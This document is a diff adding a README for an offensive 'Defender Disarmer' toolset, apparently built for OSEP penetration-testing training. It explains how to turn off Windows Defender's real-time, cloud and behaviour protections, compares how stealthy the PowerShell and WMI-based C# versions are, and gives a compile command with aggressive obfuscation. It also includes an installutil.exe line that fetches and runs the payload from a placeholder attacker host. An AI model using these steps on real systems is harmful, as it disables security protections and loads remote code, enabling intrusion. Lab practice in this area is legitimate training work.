@@ -1,0 +1,39 @@
+# OSEP Defender Disarmer Toolset
+
+This toolset disables Windows Defender's active protection components (Real-time, Cloud, Behavior monitoring, etc.).
+
+### HOW IT WORKS
+- **PowerShell Version**: Uses the `Set-MpPreference` cmdlet. Easy to use but highly signatured and logged by PowerShell telemetry.
+- **C# Version**: Uses WMI properties on the `MSFT_MpPreference` instance. Stealthier as it modifies settings via the WMI repository rather than direct cmdlets.
+
+### PREREQUISITES
+- **Permissions**: **HIGH INTEGRITY (ADMIN)** is mandatory. Protections cannot be disabled as a normal user.
+- **TAMPER PROTECTION**: If "Tamper Protection" is enabled in Windows Settings, these tools may report "Success" but the settings will immediately revert or the API call will be silently ignored. In modern Windows, you must often disable Tamper Protection manually or via an exploit before these tools will work.
+
+---
+
+### OPTION 1: PowerShell (Kill-Defender.ps1)
+Run directly on the target:
+
+PS> .\Kill-Defender.ps1
+
+---
+
+### OPTION 2: C# (Kill-Defender.cs)
+Best used with the OSEP AssemblyLoader.
+
+#### STEP 1: Compile
+$ python3 /home/kali/OSEP-TOOLS/PayloadCompiler/PayloadCompiler.py \
+    -p /home/kali/OSEP-TOOLS/Helpers/AVDisarm/Kill-Defender/Kill-Defender.cs \
+    -m classic \
+    --obfuscate aggressive \
+    -o KillDefender.exe
+
+#### STEP 2: Execute (via AssemblyLoader)
+C:\...>installutil.exe /U /URL=http://<KALI_IP>/KillDefender.exe AssemblyLoader.exe
+
+---
+
+### VERIFICATION
+The tools will report the current status. You can also verify manually:
+PS> Get-MpComputerStatus | select *Enabled*
